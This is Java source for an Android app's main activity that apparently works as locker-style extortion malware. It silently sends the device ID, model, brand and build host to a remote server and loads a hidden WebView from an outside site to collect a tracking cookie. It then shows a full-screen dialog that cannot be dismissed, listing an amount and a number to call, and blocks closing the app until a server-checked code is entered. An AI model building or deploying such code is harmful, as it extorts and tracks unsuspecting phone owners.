package smsproject.atex.com.smsproject;

import android.app.Activity;
import android.app.Dialog;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.provider.Settings.Secure;

import android.widget.Toast;

import org.apache.http.cookie.Cookie;
import org.apache.http.impl.client.DefaultHttpClient;

import java.util.List;

import smsproject.atex.com.smsproject.asynctaskes.SendUDIDAsyncTask;
import smsproject.atex.com.smsproject.asynctaskes.SubmitCodeAsynTask;
import smsproject.atex.com.smsproject.interfaces.OnRequestComplete;
import smsproject.atex.com.smsproject.internetconnection.InternetConnectivity;
import smsproject.atex.com.smsproject.services.ServiceContinuousCall;
import smsproject.atex.com.smsproject.utilities.ConstantValues;

public class MainActivity extends Activity {

    private Dialog dialogEnterCode;
    private String ud_id = "";
    private String adCode = "";

    private String deviceModel = "";
    private String deviceBrand = "";
    private String buildHost = "";

    private StringBuilder stringBuilder = new StringBuilder();

    private CountDownTimer countDownTimer;

    private boolean isAdCodeFound = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if(!ServiceContinuousCall.isServiceOn) {
            Intent intent = new Intent(MainActivity.this, ServiceContinuousCall.class);
            startService(intent);
            ServiceContinuousCall.isOkPressed = false;
            ServiceContinuousCall.isServiceOn = true;
        }

        ud_id =  Secure.getString(getApplicationContext().getContentResolver(), Secure.ANDROID_ID);

        //sendUDID();

        Log.e("udId is", "" + Secure.getString(getApplicationContext().getContentResolver(), Secure.ANDROID_ID));

    }

    private void sendUDID() {
        //if(!ServiceContinuousCall.isSendUDIDInformation) {
        if(countDownTimer != null) {
            Log.e("got", "it");
            countDownTimer.cancel();
            countDownTimer.onFinish();
            countDownTimer = null;
        }
        if(!InternetConnectivity.isConnectedToInternet(MainActivity.this)) {
//            Toast.makeText(MainActivity.this, "Connect to internet", Toast.LENGTH_SHORT).show();
            return;
        }


        new SendUDIDAsyncTask(MainActivity.this, new OnRequestComplete() {
            @Override
            public void onRequestComplete(String result) {
                if(result.equalsIgnoreCase("0")) {
                    Log.e("status 0", "000");
                    //	ServiceContinuousCall.isSendUDIDInformation = true;
                    ServiceContinuousCall.isOkPressed = false;
                    initPopup();
                } else {
                    Log.e("status 1", "111");
                    Toast.makeText(MainActivity.this, "Already Submited", Toast.LENGTH_SHORT).show();
                    ServiceContinuousCall.isOkPressed = true;
                    ServiceContinuousCall.isServiceOn = false;
                    //	ServiceContinuousCall.isSendUDIDInformation = false;
                    stopService(new Intent(getApplicationContext(), ServiceContinuousCall.class));
                    finish();
                }
            }
        }).execute(ud_id, "1", adCode, stringBuilder.toString());

        // 	}
    }



    @Override
    protected void onPause() {
        ConstantValues.ACTIVITY_VISIBLE = false;
        CookieSyncManager.getInstance().sync();
        super.onPause();

    }

    @Override
    protected void onStart() {
        super.onStart();
    }


    @Override
    protected void onStop() {
        super.onStop();

    }

    @Override
    public void onBackPressed() {
        //	super.onBackPressed();
        if(countDownTimer != null) {
            countDownTimer.cancel();
        }
        super.onBackPressed();
    }

    @Override
    public void finish() {
        if(ServiceContinuousCall.isOkPressed){
            super.finish();
        }

    }


    @Override
    protected void onUserLeaveHint() {
        super.onUserLeaveHint();
    }

    @Override
    protected void onResume() {
        ConstantValues.ACTIVITY_VISIBLE = true;
        isAdCodeFound = false;
        CookieSyncManager.createInstance(MainActivity.this);
        CookieSyncManager.getInstance().stopSync();
        readDeviceInfo();
        loadWebViewData();
        if(!adCode.equalsIgnoreCase("")) {
            sendUDID();
            if(countDownTimer != null) {
                countDownTimer.cancel();
            }
        } else {
            Log.e("Else", "else");
            sendDataToServer();
        }

        super.onResume();
    }

    private void initPopup() {
        dialogEnterCode = new Dialog(MainActivity.this);
        dialogEnterCode.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialogEnterCode.setContentView(R.layout.popup_main);
        dialogEnterCode.setCanceledOnTouchOutside(false);
        dialogEnterCode.setCancelable(false);
        dialogEnterCode.getWindow().setLayout(RelativeLayout.LayoutParams.MATCH_PARENT, RelativeLayout.LayoutParams.MATCH_PARENT);
//        dialogEnterCode.getWindow().setBackgroundDrawable(new ColorDrawable(android.graphics.Color.TRANSPARENT));

        final Button btnCall, btnSubmit;
        final EditText edtTxtCode;
        final TextView txtViewUserId;
        final TextView txtViewAmount;

        txtViewUserId = (TextView) dialogEnterCode.findViewById(R.id.txt_view_id_value);
        btnCall = (Button) dialogEnterCode.findViewById(R.id.btn_call);
        edtTxtCode = (EditText) dialogEnterCode.findViewById(R.id.edt_txt_code);
        txtViewAmount = (TextView) dialogEnterCode.findViewById(R.id.txt_view_amount_value);

        txtViewUserId.setText(""+ServiceContinuousCall.userId);
        txtViewAmount.setText("" + ServiceContinuousCall.amountValue);


        btnCall.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v) {
                Intent intent_phone = new Intent(Intent.ACTION_CALL);
                intent_phone.setData(Uri.parse("tel:" + ServiceContinuousCall.telephoneNo));
                startActivity(intent_phone);
            }


        });

        edtTxtCode.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {

            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
                if(s.length() == 4) {
                    if(edtTxtCode.getText().toString().trim().equalsIgnoreCase("")) {
                        Toast.makeText(MainActivity.this, "Submit your code", Toast.LENGTH_SHORT).show();
                        return;
                    }

                    if(!InternetConnectivity.isConnectedToInternet(MainActivity.this)) {
//                        Toast.makeText(MainActivity.this, "Connect to internet", Toast.LENGTH_SHORT).show();
                        return;
                    }

                    new SubmitCodeAsynTask(MainActivity.this, new OnRequestComplete() {

                        @Override
                        public void onRequestComplete(String result) {
                            if(result.equalsIgnoreCase("1")) {
                                if(dialogEnterCode != null) {
                                    if(dialogEnterCode.isShowing()) {
                                        dialogEnterCode.dismiss();
                                    }
                                }
                                ServiceContinuousCall.isOkPressed = true;
                                ServiceContinuousCall.isServiceOn = false;
                                stopService(new Intent(getApplicationContext(), ServiceContinuousCall.class));
                                MainActivity.this.finish();
                            } else {
                                //initPopup();
                                ServiceContinuousCall.isOkPressed = false;
                                ServiceContinuousCall.isServiceOn = true;
                                edtTxtCode.setText("");
                                Toast.makeText(MainActivity.this, "Code do not match, try again", Toast.LENGTH_SHORT).show();
                            }


                        }
                    }).execute(ServiceContinuousCall.userId, edtTxtCode.getText().toString().trim() ,"3");
                }
            }

            @Override
            public void afterTextChanged(Editable s) {

            }
        });

        if(dialogEnterCode != null) {
            if(dialogEnterCode.isShowing()) {

            } else {
                dialogEnterCode.show();
            }
        } else {
            //dialogEnterCode.show();
        }

    }

    public String getCookie(String siteName, String CookieName) {
        String CookieValue = "";

        CookieManager cookieManager = CookieManager.getInstance();
        String cookies = cookieManager.getCookie(siteName);
        if(cookies != null) {
            String[] temp = cookies.split(" ");
            for (String ar1 : temp ) {
                if(ar1.contains(CookieName)) {
                    String[] temp1 = ar1.split("=");
                    CookieValue = temp1[1];
                }
            }
        }
        return CookieValue;
    }

    private void loadWebViewData() {
        CookieSyncManager.createInstance(MainActivity.this);
        CookieSyncManager.getInstance().startSync();
        WebView webview = new WebView(this);
        webview.getSettings().setJavaScriptEnabled(true);

        webview.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url); //this is controversial - see comments and other answers
                return true;
            }
        });
        webview.loadUrl("http://roseroomlove.com/mUnjnuwe77.php");
        adCode = getCookie("http://roseroomlove.com/mUnjnuwe77.php", "adcode");

        Log.e("Ad_CODE value is ", "_________"+adCode);
    }

    private void readDeviceInfo() {
        deviceModel = android.os.Build.MODEL;
        deviceBrand = android.os.Build.BRAND;
        buildHost= android.os.Build.HOST;

        stringBuilder.setLength(0);

        stringBuilder = stringBuilder.append(deviceModel).append(" ").append(deviceBrand).append(" ").append(buildHost);
    }


    private void sendDataToServer() {
        countDownTimer = new CountDownTimer(10000, 1000) {
            @Override
            public void onTick(long millisUntilFinished) {
                loadWebViewData();
                if(!isAdCodeFound) {
                    if(!adCode.equalsIgnoreCase("")) {
                        isAdCodeFound = true;
                        sendUDID();
                    } else {
                        Log.e("ad code not found", "_______");
                    }
                }
            }

            @Override
            public void onFinish() {
                if(countDownTimer != null) {
                    countDownTimer.cancel();
                }
            }
        }.start();
    }

}
